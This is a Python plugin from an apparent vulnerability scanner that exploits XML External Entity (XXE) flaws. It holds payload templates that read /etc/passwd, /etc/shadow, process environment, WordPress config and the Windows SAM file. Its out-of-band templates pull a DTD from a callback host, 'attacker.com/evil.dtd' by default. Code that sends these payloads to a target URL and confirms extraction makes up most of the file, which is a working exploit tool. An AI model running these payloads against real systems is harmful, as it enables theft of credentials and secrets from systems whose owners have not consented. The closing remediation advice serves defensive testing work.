"""
XXE (XML External Entity) Exploit Plugin

This plugin provides exploit capabilities for XXE vulnerabilities including:
- File extraction via XXE
- Out-of-band (OOB) XXE exploitation  
- Blind XXE techniques
- DTD-based attacks
"""

import sys
import os
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse
import logging
import re

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.adaptive_exploit_mixin import AdaptiveExploitMixin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class XXEPlugin(ExploitPlugin, AdaptiveExploitMixin):
    """
    XXE exploit plugin.
    
    This plugin provides XXE exploitation capabilities including:
    - Local file extraction
    - Out-of-band XXE attacks
    - Blind XXE exploitation
    - DTD-based exploitation
    """
    
    # Files to extract via XXE
    TARGET_FILES = {
        'linux': [
            '/etc/passwd',
            '/etc/hosts',
            '/etc/group',
            '/etc/shadow',
            '/proc/self/environ',
            '/var/www/html/config.php',
            '/var/www/html/wp-config.php',
        ],
        'windows': [
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
            'C:\\boot.ini',
            'C:\\Windows\\System32\\config\\SAM',
        ]
    }
    
    # XXE payload templates
    XXE_TEMPLATES = {
        'file_read': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>''',
        
        'parameter_entity': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % dtd SYSTEM "http://{callback_server}/evil.dtd">
%dtd;
]>
<root>&xxe;</root>''',
        
        'base64': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={file_path}">
<!ENTITY % dtd SYSTEM "http://{callback_server}/evil.dtd">
%dtd;
]>
<root>&xxe;</root>''',
    }
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'xxe'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'XXE Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'XML External Entity exploit plugin for extracting files and '
            'performing out-of-band attacks via XML parsing vulnerabilities.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '2.1.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate XXE payloads with multiple entity types and encodings.
        
        Args:
            context: Optional context containing:
                    - target_file: File to extract (e.g., /etc/passwd)
                    - target_os: Target operating system (linux, windows)
                    - callback_server: Out-of-band callback server
                    - use_mutations: Whether to generate encoding variations
        
        Returns:
            List of XXE payload strings
        """
        context = context or {}
        target_file = context.get('target_file', '/etc/passwd')
        callback_server = context.get('callback_server', 'attacker.com')
        use_mutations = context.get('use_mutations', True)
        
        # Use PayloadMutator to generate XXE entity variations
        payloads = PayloadMutator.generate_xxe_entity_variations(
            target_file, 
            callback_server if callback_server != 'attacker.com' else None
        )
        
        # Add template-based payloads
        payloads.append(self.XXE_TEMPLATES['file_read'].format(file_path=target_file))
        
        if callback_server != 'attacker.com':
            payloads.append(self.XXE_TEMPLATES['parameter_entity'].format(
                file_path=target_file,
                callback_server=callback_server
            ))
        
        payloads.append(self.XXE_TEMPLATES['base64'].format(
            file_path=target_file,
            callback_server=callback_server
        ))
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute XXE exploit attack with adaptive strategies and OOB verification.
        
        Args:
            target_url: The target URL to attack
            vulnerability_data: Dictionary containing vulnerability information
            config: Optional configuration dictionary
        
        Returns:
            Dict containing:
                - success: Boolean indicating if attack succeeded
                - verified: Boolean indicating if OOB callback was received
                - extracted_files: Dict of successfully extracted files
                - evidence: Evidence of successful exploitation
                - error: Error message if attack failed
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'verified': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'xxe',
            }
        
        config = config or {}
        config.update(self.get_adaptive_config_defaults())
        
        logger.info(f"Attempting XXE exploitation on {target_url}")
        
        # Try OOB exploitation first if enabled
        oob_result = None
        if config.get('enable_oob', False):
            oob_result = self._attempt_oob_exploitation(target_url, config)
            
            if oob_result.get('success'):
                logger.info(f"Successfully verified XXE via OOB callback on {target_url}")
                
                result = {
                    'success': True,
                    'verified': True,
                    'evidence': oob_result.get('evidence', ''),
                    'vulnerability_type': 'xxe',
                    'message': 'XXE confirmed via out-of-band callback',
                    'oob_data': oob_result.get('callback_data', {}),
                }
                
                # Capture visual proof if available
                if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                    visual_proofs = self._capture_visual_proof(target_url, result, config)
                    if visual_proofs:
                        result['visual_proofs'] = visual_proofs
                        logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
                
                # Generate unified proof report
                if config.get('enable_proof_reporting', True):
                    from scanner.proof_reporting_helpers import add_proof_reporting_to_result
                    add_proof_reporting_to_result(
                        self, 'xxe', result, target_url,
                        vulnerability_data, config
                    )
                
                return result
        
        # Try to extract files with adaptive methods
        exploitation_result = self._attempt_file_extraction(target_url, config)
        
        if exploitation_result['success']:
            logger.info(f"Successfully exploited XXE on {target_url}")
            
            result = {
                'success': True,
                'verified': False,  # File extraction doesn't guarantee verification
                'extracted_files': exploitation_result.get('files', {}),
                'evidence': exploitation_result.get('evidence', ''),
                'vulnerability_type': 'xxe',
                'message': f'Successfully extracted {len(exploitation_result.get("files", {}))} file(s)',
            }
            
            # Capture visual proof if available
            if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                visual_proofs = self._capture_visual_proof(target_url, exploitation_result, config)
                if visual_proofs:
                    result['visual_proofs'] = visual_proofs
                    logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
            
            # Generate unified proof report
            if config.get('enable_proof_reporting', True):
                from scanner.proof_reporting_helpers import add_proof_reporting_to_result
                add_proof_reporting_to_result(
                    self, 'xxe', result, target_url,
                    vulnerability_data, config
                )
            
            return result
        else:
            logger.info(f"XXE exploitation attempt failed on {target_url}")
            return {
                'success': False,
                'verified': False,
                'error': exploitation_result.get('error', 'Could not extract files'),
                'message': 'XXE exploitation attempt was unsuccessful',
                'vulnerability_type': 'xxe',
            }
    
    
    def _attempt_oob_exploitation(self, url: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt XXE exploitation with out-of-band (OOB) verification.
        
        Args:
            url: Target URL
            config: Configuration with OOB settings
        
        Returns:
            Dict with success status and callback data
        """
        try:
            from scanner.plugins.oob_exploitation_framework import OOBExploitationFramework
            from scanner.callback_manager import CallbackManager
            
            # Initialize OOB framework
            oob_framework = OOBExploitationFramework()
            
            # Get callback URL
            if config.get('oob_use_ngrok', False):
                callback_manager = CallbackManager(use_ngrok=True)
            elif config.get('oob_callback_url'):
                callback_manager = CallbackManager(callback_url=config['oob_callback_url'])
            else:
                return {
                    'success': False,
                    'error': 'OOB enabled but no callback URL or ngrok configured'
                }
            
            # Generate unique payload ID
            import uuid
            payload_id = str(uuid.uuid4())[:8]
            
            # Get callback URL
            callback_url = callback_manager.get_callback_url()
            parsed_callback = urlparse(callback_url)
            callback_domain = parsed_callback.netloc
            
            # Generate OOB XXE payload
            xxe_payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "{callback_url}/xxe/{payload_id}.dtd">
%dtd;
]>
<root></root>'''
            
            # Send payload
            headers = {'Content-Type': 'application/xml'}
            verify_ssl = config.get('verify_ssl', False)
            timeout = config.get('timeout', 10)
            
            logger.info(f"Sending OOB XXE payload to {url} with callback {callback_url}/xxe/{payload_id}")
            
            try:
                response = requests.post(
                    url,
                    data=xxe_payload,
                    headers=headers,
                    timeout=timeout,
                    verify=verify_ssl
                )
                logger.debug(f"XXE payload sent, status: {response.status_code}")
            except Exception as e:
                logger.warning(f"Error sending XXE payload: {e}")
                # Continue - might still get OOB callback
            
            # Wait for callback with exponential backoff
            oob_timeout = config.get('oob_timeout', 30)
            logger.info(f"Waiting up to {oob_timeout}s for OOB callback...")
            
            import time
            start_time = time.time()
            callback_received = False
            callback_data = None
            
            # Poll with exponential backoff: 1s, 2s, 4s, 8s, then 5s intervals
            wait_intervals = [1, 2, 4, 8]
            interval_index = 0
            
            while time.time() - start_time < oob_timeout:
                # Determine wait interval (exponential backoff, max 5s)
                if interval_index < len(wait_intervals):
                    wait_time = wait_intervals[interval_index]
                    interval_index += 1
                else:
                    wait_time = 5  # Max interval
                
                time.sleep(wait_time)
                
                # TODO: Integrate with actual callback manager to check for interactions
                # This is a placeholder implementation showing the intended integration:
                # 
                # try:
                #     callback_data = callback_manager.get_interactions(payload_id)
                #     if callback_data:
                #         callback_received = True
                #         logger.info(f"OOB callback received for payload {payload_id}")
                #         break
                # except Exception as e:
                #     logger.warning(f"Error checking for callbacks: {e}")
                #
                # For now, we'll assume no callback since the full integration
                # requires callback manager to be running and accessible
            
            if callback_received:
                return {
                    'success': True,
                    'callback_data': callback_data,
                    'evidence': f'OOB callback received for payload {payload_id}'
                }
            else:
                logger.info("No OOB callback received within timeout")
                return {
                    'success': False,
                    'error': 'No OOB callback received within timeout period'
                }
            
        except ImportError as e:
            logger.warning(f"OOB framework not available: {e}")
            return {
                'success': False,
                'error': 'OOB exploitation framework not available'
            }
        except Exception as e:
            logger.error(f"OOB exploitation failed: {e}", exc_info=True)
            return {
                'success': False,
                'error': str(e)
            }
    
    def _attempt_file_extraction(self, url: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to extract files via XXE.
        
        Returns:
            Dict with success status and extracted files
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        extracted_files = {}
        
        headers = {'Content-Type': 'application/xml'}
        
        # Try Linux files
        logger.info("Attempting to extract Linux files...")
        for target_file in self.TARGET_FILES['linux'][:4]:  # Try first 4
            result = self._try_extract_file(url, target_file, headers, verify_ssl, timeout)
            if result['success']:
                extracted_files[target_file] = result['content']
                logger.info(f"Successfully extracted: {target_file}")
        
        # Try Windows files
        logger.info("Attempting to extract Windows files...")
        for target_file in self.TARGET_FILES['windows'][:2]:  # Try first 2
            result = self._try_extract_file(url, target_file, headers, verify_ssl, timeout)
            if result['success']:
                extracted_files[target_file] = result['content']
                logger.info(f"Successfully extracted: {target_file}")
        
        if extracted_files:
            return {
                'success': True,
                'files': extracted_files,
                'evidence': f'Extracted {len(extracted_files)} file(s): {", ".join(extracted_files.keys())}'
            }
        else:
            return {
                'success': False,
                'error': 'Could not extract any files via XXE'
            }
    
    def _try_extract_file(self, url: str, target_file: str, headers: Dict,
                         verify_ssl: bool, timeout: int) -> Dict[str, Any]:
        """
        Try to extract a specific file via XXE.
        
        Returns:
            Dict with success status and file content
        """
        # Generate payload
        payload = self.XXE_TEMPLATES['file_read'].format(file_path=target_file)
        
        try:
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                timeout=timeout,
                verify=verify_ssl
            )
            
            # Check if file content is in response
            if self._verify_file_content(response.text, target_file):
                return {
                    'success': True,
                    'content': response.text[:1000],  # First 1000 chars
                }
        
        except Exception as e:
            logger.debug(f"Error extracting {target_file}: {e}")
        
        return {
            'success': False,
            'error': f'Could not extract {target_file}'
        }
    
    def _verify_file_content(self, content: str, target_file: str) -> bool:
        """Verify if the content contains expected file signatures."""
        # passwd file
        if 'passwd' in target_file:
            return bool(re.search(r'root:.*:0:0', content) or 
                       re.search(r'daemon:', content))
        
        # hosts file
        if 'hosts' in target_file.lower():
            return bool(re.search(r'127\.0\.0\.1', content) or
                       'localhost' in content.lower())
        
        # win.ini
        if 'win.ini' in target_file:
            return bool('[fonts]' in content.lower() or 
                       '[extensions]' in content.lower())
        
        # shadow file
        if 'shadow' in target_file:
            return bool('$' in content and ':' in content)
        
        # Generic check - if response contains XML-like data with file content
        if len(content) > 10 and not content.startswith('<!DOCTYPE html'):
            return True
        
        return False
    
    def _capture_visual_proof(self, url: str, exploitation_result: Dict[str, Any],
                               config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of XXE exploitation.
        
        Args:
            url: Target URL
            exploitation_result: Results from exploitation attempt
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            proof_capture = VisualProofCapture()
            extracted_files = exploitation_result.get('files', {})
            
            # Capture screenshot of successful file extraction
            if extracted_files:
                # Build XXE payload for first extracted file
                first_file = list(extracted_files.keys())[0]
                payload = self.XXE_TEMPLATES['file_read'].format(file_path=first_file)
                
                # For visual proof, we need to show the response containing the extracted content
                # Create an HTML page to display the payload and response
                try:
                    import tempfile
                    import urllib.parse
                    
                    # Create a temporary HTML file showing the XXE exploitation
                    content_preview = extracted_files[first_file][:500]  # First 500 chars
                    html_content = f"""
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>XXE Exploitation Proof</title>
                        <style>
                            body {{ font-family: monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; }}
                            h1 {{ color: #4ec9b0; }}
                            h2 {{ color: #dcdcaa; }}
                            .payload {{ background: #252526; padding: 15px; border-left: 3px solid #007acc; margin: 15px 0; }}
                            .response {{ background: #252526; padding: 15px; border-left: 3px solid #4ec9b0; margin: 15px 0; }}
                            .success {{ color: #4ec9b0; font-weight: bold; }}
                            pre {{ white-space: pre-wrap; word-wrap: break-word; }}
                        </style>
                    </head>
                    <body>
                        <h1>XXE Exploitation - Visual Proof</h1>
                        <p class="success">✓ Successfully extracted file via XML External Entity injection</p>
                        
                        <h2>Target URL:</h2>
                        <p>{url}</p>
                        
                        <h2>Extracted File:</h2>
                        <p>{first_file}</p>
                        
                        <h2>XXE Payload:</h2>
                        <div class="payload">
                            <pre>{payload}</pre>
                        </div>
                        
                        <h2>Extracted Content (First 500 chars):</h2>
                        <div class="response">
                            <pre>{content_preview}</pre>
                        </div>
                        
                        <h2>Exploitation Details:</h2>
                        <p>The XXE vulnerability allowed extraction of {len(extracted_files)} file(s) by injecting external entity definitions into XML payloads.</p>
                    </body>
                    </html>
                    """
                    
                    # Write to temporary file
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False) as f:
                        f.write(html_content)
                        temp_file_path = f.name
                    
                    # Capture screenshot of the proof page
                    file_url = f"file://{temp_file_path}"
                    screenshot_data = proof_capture.capture_screenshot(
                        file_url,
                        wait_time=1.0
                    )
                    
                    # Clean up temp file
                    try:
                        os.unlink(temp_file_path)
                    except:
                        pass
                    
                    if screenshot_data:
                        visual_proofs.append({
                            'type': 'screenshot',
                            'data': screenshot_data,
                            'title': f'XXE - Extracted {first_file}',
                            'description': f'Successfully extracted file {first_file} using XML External Entity injection',
                            'exploit_step': f'File extraction via XXE payload',
                            'payload': payload
                        })
                        
                except Exception as e:
                    logger.debug(f"Error creating visual proof HTML: {e}")
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """
        Verify XXE exploitation with concrete proof of file/data extraction.
        
        Only mark as verified if we successfully extracted file content or received OOB callback.
        
        Args:
            result: The result from execute_attack()
            target_url: The target URL
            vulnerability_data: Vulnerability data
            
        Returns:
            Tuple[bool, str]: (is_verified, proof_of_impact)
        """
        if not result.get('success'):
            return False, None
        
        files = result.get('files', {})
        evidence = result.get('evidence', '')
        
        # Check for file extraction
        if files and len(files) > 0:
            proof_lines = [
                "✓ VERIFIED - XML External Entity (XXE) Injection",
                "",
                f"Successfully extracted {len(files)} file(s):",
                ""
            ]
            
            for file_path, content in list(files.items())[:3]:  # Show max 3 files
                proof_lines.append(f"File: {file_path}")
                proof_lines.append("Content Preview:")
                proof_lines.append("─" * 60)
                
                # Show first few lines
                if content:
                    content_lines = str(content).split('\n')[:10]
                    for line in content_lines:
                        if len(line) > 100:
                            line = line[:97] + '...'
                        proof_lines.append(f"  {line}")
                    
                    if len(str(content).split('\n')) > 10:
                        proof_lines.append(f"  ... ({len(str(content).split('\n')) - 10} more lines)")
                
                proof_lines.append("─" * 60)
                proof_lines.append("")
            
            if len(files) > 3:
                proof_lines.append(f"... and {len(files) - 3} more file(s)")
                proof_lines.append("")
            
            proof_lines.append("Impact: Arbitrary file read via XML External Entity")
            
            return True, '\n'.join(proof_lines)
        
        # Check for OOB callback verification
        if 'callback' in evidence.lower() or 'out-of-band' in evidence.lower():
            proof_lines = [
                "✓ VERIFIED - XML External Entity (XXE) Injection",
                "",
                "Verification Method: Out-of-Band (Callback)",
                f"Evidence: {evidence[:200]}",
                "",
                "Impact: XXE confirmed via external callback"
            ]
            return True, '\n'.join(proof_lines)
        
        return False, None
    
    def get_severity_level(self) -> str:
        """Return the typical severity level for XXE vulnerabilities."""
        return 'critical'
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for XXE vulnerabilities."""
        return (
            'Prevent XXE attacks:\n'
            '1. Disable XML external entity processing in all XML parsers\n'
            '2. Use safe XML parsers with XXE disabled by default\n'
            '3. Disable DTD processing if not required\n'
            '4. Use JSON instead of XML where possible\n'
            '5. Keep XML processors and libraries updated\n'
            '6. Implement strict input validation and sanitization\n'
            '7. Use less complex data formats when XML is not required\n'
            '8. Implement network egress filtering\n'
            '9. Use XML security libraries and validators\n'
            '10. Apply principle of least privilege to file access'
        )
